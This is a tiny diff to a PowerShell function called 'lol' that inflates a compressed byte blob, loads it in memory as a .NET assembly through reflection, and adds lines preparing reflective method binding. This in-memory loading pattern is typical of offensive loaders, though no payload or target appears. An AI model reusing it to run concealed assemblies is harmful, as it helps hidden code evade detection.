@@ -305,5 +305,7 @@ function lol{
     $c = New-Object Byte[](833536)
     $DeflatedStream.Read($c, 0, 833536) | Out-Null
     $Assembly = [Reflection.Assembly]::Load($c)
+    $BindingFlags = [Reflection.BindingFlags] "Public,Static"
+    $a = @()
 	
 }
